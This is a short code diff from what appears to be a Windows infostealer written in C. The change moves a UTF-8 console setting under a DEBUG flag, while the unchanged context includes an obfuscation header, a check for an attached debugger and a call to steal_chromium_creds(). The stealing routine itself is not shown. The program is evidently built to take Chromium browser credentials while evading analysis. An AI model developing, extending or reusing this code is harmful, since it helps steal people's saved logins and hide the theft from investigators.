@@ -2,7 +2,6 @@
 
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
 #include <wchar.h>
 #include <windows.h>
 
@@ -11,6 +10,11 @@
 #include "obfuscation.h"
 
 int main(void) {
+#ifdef DEBUG
+  // Puts the console in UTF-8
+  // Allows us to print non-ASCII characters for debug
+  SetConsoleOutputCP(CP_UTF8);
+#endif
   // Check if a debugger is attached to the process
   BOOL isDebuggerPresent = FALSE;
   HANDLE hProcess = GetCurrentProcess();
@@ -34,10 +38,6 @@ int main(void) {
         GetLastError());
 #endif
   }
-
-  // Puts the console in UTF-8
-  // Allows us to print non-ASCII characters for debug
-  SetConsoleOutputCP(CP_UTF8);
 
   steal_chromium_creds();
 
